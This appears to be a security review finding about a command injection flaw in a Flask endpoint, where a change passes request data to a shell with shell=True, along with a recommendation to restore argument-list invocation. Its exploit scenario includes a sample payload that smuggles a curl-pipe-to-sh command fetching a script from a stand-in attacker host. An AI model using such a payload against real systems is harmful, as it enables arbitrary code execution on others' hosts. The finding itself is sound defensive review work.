# Vuln 1: Command Injection: `app.py:15`

- Severity: HIGH
- Category: Command injection
- Confidence: 0.99
- Description: The pending change replaces a safe argument-vector subprocess invocation with a shell command string built from `request.json["target"]` and enables `shell=True`. Because `target` is fully attacker-controlled request data, shell metacharacters such as `;`, `&&`, `` `...` ``, or `$()` will be interpreted by `/bin/sh` rather than passed as a literal argument to `archive-job`.
- Exploit Scenario: An attacker who can call `POST /archive` with a valid ops token can submit a payload such as `{"target":"/srv/data; curl https://attacker/p.sh | sh"}`. The server will execute the injected shell fragment with the privileges of the Flask process, resulting in arbitrary command execution on the host.
- Recommendation: Do not invoke a shell for this operation. Restore the argument-list form such as `subprocess.run(["/usr/local/bin/archive-job", "--target", target], shell=False, ...)`, and keep `target` as a single argument. If specific path constraints are required, validate `target` against an allowlist before execution.
